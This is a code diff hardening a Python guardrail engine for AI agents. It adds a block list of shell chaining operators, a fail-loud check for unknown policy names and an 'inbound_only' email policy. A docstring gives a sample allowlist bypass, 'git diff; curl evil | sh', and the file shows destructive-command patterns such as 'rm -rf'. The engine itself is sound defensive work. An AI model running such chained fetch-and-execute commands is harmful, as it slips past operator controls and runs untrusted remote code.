@@ -19,6 +19,34 @@ from typing import Any
 
 logger = logging.getLogger(__name__)
 
+# Shell metacharacters that allow command chaining / redirection / substitution.
+# When an exec allowlist is active these defeat prefix-anchored patterns, so the
+# command is rejected if it contains any of them.
+_SHELL_CHAIN_OPERATORS = (";", "&&", "||", "|", "&", "$(", "`", ">", "<", "\n")
+
+# Tools that send outbound email (subject to the inbound_only policy).
+_EMAIL_SEND_TOOLS = frozenset({"gws_gmail_send", "send_email", "send-email"})
+
+# Every policy name the engine implements. Used to fail loud on an unknown
+# (typo'd / renamed / not-yet-implemented) policy instead of silently allowing.
+_KNOWN_PRE_POLICIES = frozenset(
+    {
+        "no_destructive_writes",
+        "no_external_http",
+        "no_main_branch_push",
+        "rate_limit",
+        "exec_allowlist",
+        "write_path_restrict",
+        "desktop_safety",
+        "human_approval",
+        "recurring_meeting_proposal_required",
+        "no_recent_changelog_reversal",
+        "inbound_only",
+    }
+)
+_KNOWN_POST_POLICIES = frozenset({"no_sensitive_data"})
+_KNOWN_POLICIES = _KNOWN_PRE_POLICIES | _KNOWN_POST_POLICIES
+
 # Patterns for destructive commands
 DESTRUCTIVE_PATTERNS = [
     re.compile(r"\brm\s+-rf\b", re.IGNORECASE),
@@ -198,6 +226,20 @@ class GuardrailEngine:
     _rate_counts: dict[str, list[float]] = field(default_factory=lambda: defaultdict(list))
     _human_approval_patterns: dict[str, list[str]] = field(default_factory=dict)
 
+    def __post_init__(self) -> None:
+        # Fail loud on a policy the engine can't enforce. A typo'd/renamed/
+        # unimplemented policy previously fell through to "allowed", silently
+        # disabling the guardrail the operator believed was active (audit
+        # 2026-05-29). We log rather than raise so one bad name can't crash the
+        # whole engine, but the ERROR is impossible to miss.
+        unknown = [p for p in self.enabled_policies if p not in _KNOWN_POLICIES]
+        if unknown:
+            logger.error(
+                "Unknown guardrail policy(ies) %s — NOT ENFORCED. Known: %s",
+                sorted(unknown),
+                sorted(_KNOWN_POLICIES),
+            )
+
     def check_pre_execution(
         self,
         tool_name: str,
@@ -258,6 +300,8 @@ class GuardrailEngine:
             return self._check_recurring_meeting_proposal(tool_name, tool_args, prior_steps)
         if policy == "no_recent_changelog_reversal":
             return self._check_changelog_reversal(tool_name, tool_args)
+        if policy == "inbound_only":
+            return self._check_inbound_only(tool_name, tool_args)
         return GuardrailResult()
 
     def _run_post_policy(
@@ -359,13 +403,31 @@ class GuardrailEngine:
     def _check_exec_allowlist(
         self, tool_name: str, tool_args: dict[str, Any], agent_id: str
     ) -> GuardrailResult:
-        """Block exec/shell commands not matching the agent's allowlist patterns."""
+        """Block exec/shell commands not matching the agent's allowlist patterns.
+
+        The command runs via ``/bin/sh -c``, so an allowlist pattern that only
+        anchors the *prefix* (e.g. ``^git diff``) is trivially defeated by
+        shell chaining: ``git diff; curl evil | sh`` matches the prefix and then
+        runs anything. When an allowlist is active we therefore reject shell
+        metacharacters outright — the allowlisted commands in practice are
+        single, simple invocations that never need them (audit 2026-05-29).
+        """
         if tool_name not in ("exec", "shell"):
             return GuardrailResult()
         patterns = self._exec_allowlists.get(agent_id, [])
         if not patterns:  # No allowlist configured = no restriction (backward compat)
             return GuardrailResult()
         command = str(tool_args.get("command", ""))
+        if any(op in command for op in _SHELL_CHAIN_OPERATORS):
+            return GuardrailResult(
+                allowed=False,
+                action="blocked",
+                reason=(
+                    "exec blocked: shell chaining/redirection is not allowed when an "
+                    f"allowlist is active: {command[:100]}"
+                ),
+                guardrail_name="exec_allowlist",
+            )
         for pattern in patterns:
             if pattern.search(command):
                 return GuardrailResult()
@@ -374,6 +436,31 @@ class GuardrailEngine:
             action="blocked",
             reason=f"exec command not in allowlist: {command[:100]}",
             guardrail_name="exec_allowlist",
+        )
+
+    def _check_inbound_only(self, tool_name: str, tool_args: dict[str, Any]) -> GuardrailResult:
+        """Allow email sends only as a reply within an existing thread.
+
+        Prevents an ``inbound_only`` agent from initiating cold outbound mail: a
+        send is permitted only when it carries a ``thread_id`` or ``in_reply_to``
+        (i.e. it replies into a conversation the operator/contact started). This
+        policy was enabled in a manifest but had no handler, so it silently did
+        nothing (audit 2026-05-29).
+        """
+        if tool_name not in _EMAIL_SEND_TOOLS:
+            return GuardrailResult()
+        thread_id = str(tool_args.get("thread_id", "") or "").strip()
+        in_reply_to = str(tool_args.get("in_reply_to", "") or "").strip()
+        if thread_id or in_reply_to:
+            return GuardrailResult()
+        return GuardrailResult(
+            allowed=False,
+            action="blocked",
+            reason=(
+                "inbound_only: outbound email must reply within an existing thread "
+                "(set thread_id or in_reply_to); cold outreach is not allowed"
+            ),
+            guardrail_name="inbound_only",
         )
 
     def _check_write_path(
